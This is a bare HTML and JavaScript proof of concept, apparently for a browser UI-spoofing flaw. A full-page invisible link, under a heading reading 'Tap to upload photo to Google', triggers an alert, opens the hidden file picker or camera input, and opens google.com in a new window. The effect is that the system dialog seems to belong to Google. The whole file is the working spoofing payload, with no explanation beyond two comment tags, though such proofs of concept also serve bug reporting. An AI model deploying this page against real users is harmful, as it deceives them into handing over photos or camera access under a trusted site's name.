<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
    h1 {
        margin: 1em;
    }

    a {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
    }

    input {
        display: none;
    }

    img {
        width: 100%;
    }
</style>

<h1>Tap to upload photo to Google</h1>

<!-- [poc-with-system-dialog]: -->
<input id="fileSelect" type="file" accept="image/*" />

<!-- [poc-with-camera]: -->
<!-- <input id="fileSelect" type="file" accept="*/*" /> -->

<img id="img">
<a id="link" target="_blank"></a>

<script>
    link.onclick = () => {	
        alert();
        fileSelect.click();	
        window.open('https://google.com');

    }

    fileSelect.onchange = (event) => {
        img.src = URL.createObjectURL(fileSelect.files[0]);
    }
</script>
